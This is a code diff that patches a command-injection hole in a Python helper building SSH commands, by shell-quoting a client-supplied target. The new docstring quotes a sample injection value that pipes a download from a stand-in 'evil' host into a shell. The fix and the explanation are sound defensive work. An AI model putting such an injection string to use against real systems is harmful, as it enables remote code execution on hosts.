@@ -56,9 +56,18 @@ def exec_safe_command(command: str) -> str:
 
 
 def wrap_command(command: str, *, transport: str, ssh_target: str) -> str:
-    """Wrap a command for the target transport. Remote → single SSH invocation."""
+    """Wrap a command for the target transport. Remote → single SSH invocation.
+
+    SECURITY: ``ssh_target`` can arrive from the client request body (the
+    ``services``/``launch`` apply routes forward it verbatim), and run_steps runs
+    the result under ``shell=True``. It MUST be shell-quoted — an unquoted target
+    like ``x; curl evil|sh #`` would otherwise be command injection on the
+    management host. A legitimate ``user@host`` has no shell metacharacters, so
+    quoting is a no-op for it; a malicious one collapses to a single (harmless,
+    unresolvable) hostname token.
+    """
     if transport == "ssh" and ssh_target:
-        return f"ssh {ssh_target} {shlex.quote(command)}"
+        return f"ssh {shlex.quote(ssh_target)} {shlex.quote(command)}"
     return command
 
 
